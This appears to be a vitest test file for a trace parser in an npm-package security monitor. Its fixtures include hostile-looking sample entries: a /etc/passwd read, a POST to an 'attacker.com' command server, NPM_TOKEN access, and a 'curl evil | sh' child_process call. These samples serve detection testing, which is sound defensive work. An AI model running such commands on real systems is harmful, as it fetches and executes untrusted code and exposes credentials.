import { describe, it, expect } from "vitest";
import { parseL4Trace } from "./l4-parser.js";

function wrap(entries: unknown[]): string {
  return `some earlier output\n__NPMGUARD_TRACE__${JSON.stringify(entries)}__NPMGUARD_TRACE_END__\n`;
}

describe("parseL4Trace", () => {
  it("returns null when no markers are present", () => {
    expect(parseL4Trace("no markers here")).toBeNull();
  });

  it("returns null when only START_MARKER is present", () => {
    expect(parseL4Trace("__NPMGUARD_TRACE__[]no-end")).toBeNull();
  });

  it("returns null when trace JSON is malformed", () => {
    expect(parseL4Trace("__NPMGUARD_TRACE__not-json__NPMGUARD_TRACE_END__")).toBeNull();
  });

  it("returns null when trace JSON is not an array", () => {
    expect(parseL4Trace("__NPMGUARD_TRACE__{}__NPMGUARD_TRACE_END__")).toBeNull();
  });

  it("parses an empty trace to an empty array", () => {
    const events = parseL4Trace(wrap([]));
    expect(events).toEqual([]);
  });

  it("maps each L4 type to the right Event kind", () => {
    const entries = [
      { type: "require", module: "fs", from: "/pkg/index.js" },
      { type: "fs", method: "readFileSync", path: "/etc/passwd" },
      { type: "network", method: "POST", url: "http://attacker.com/c2" },
      { type: "process", method: "exec", cmd: "curl bad.com" },
      { type: "env", key: "NPM_TOKEN" },
      { type: "eval", code: "console.log(1)" },
      { type: "crypto", method: "createDecipheriv", algo: "aes-256-cbc" },
      { type: "timer", kind: "setTimeout", ms: 60000 },
    ];
    const events = parseL4Trace(wrap(entries));
    expect(events).not.toBeNull();
    expect(events!.map((e) => e.kind)).toEqual([
      "require",
      "fs_op",
      "network",
      "process",
      "env_access",
      "eval",
      "crypto",
      "timer",
    ]);
  });

  it("sets stream to L4:monkey and assigns index as timestamp", () => {
    const events = parseL4Trace(wrap([
      { type: "env", key: "A" },
      { type: "env", key: "B" },
    ]));
    expect(events!.every((e) => e.stream === "L4:monkey")).toBe(true);
    expect(events!.map((e) => e.timestamp)).toEqual([0, 1]);
  });

  it("routes a `script` entry to the L4:v8inspector stream with its decoded source", () => {
    const events = parseL4Trace(wrap([
      { type: "require", module: "fs" },
      { type: "script", url: "", source: "require('child_process').exec('curl evil | sh')", len: 4210 },
    ]));
    const script = events!.find((e) => e.kind === "script_parsed")!;
    expect(script.stream).toBe("L4:v8inspector");
    expect(script.normalized).toEqual({
      url: "",
      source: "require('child_process').exec('curl evil | sh')",
      len: 4210, // true length carried through (may exceed the captured source when capped)
    });
    // the monkey-patch entry stays on its own stream
    expect(events!.find((e) => e.kind === "require")!.stream).toBe("L4:monkey");
  });

  it("normalizes network URL + method", () => {
    const events = parseL4Trace(wrap([
      { type: "network", method: "GET", url: "https://api.example.com/data" },
    ]));
    expect(events![0]!.normalized).toEqual({
      method: "GET",
      url: "https://api.example.com/data",
    });
  });

  it("preserves raw payload verbatim", () => {
    const entry = { type: "env", key: "SECRET" };
    const events = parseL4Trace(wrap([entry]));
    expect(events![0]!.raw).toEqual(entry);
  });

  it("uses the last marker pair (defeats early injection)", () => {
    const injected = "__NPMGUARD_TRACE__[{\"type\":\"env\",\"key\":\"FAKE\"}]__NPMGUARD_TRACE_END__";
    const real = wrap([{ type: "env", key: "REAL" }]);
    const output = injected + "\n" + real;
    const events = parseL4Trace(output);
    expect(events).not.toBeNull();
    expect(events![0]!.normalized?.key).toBe("REAL");
  });

  it("caps eval code at 200 chars in normalized", () => {
    const longCode = "a".repeat(500);
    const events = parseL4Trace(wrap([{ type: "eval", code: longCode }]));
    expect((events![0]!.normalized?.code as string).length).toBe(200);
  });
});
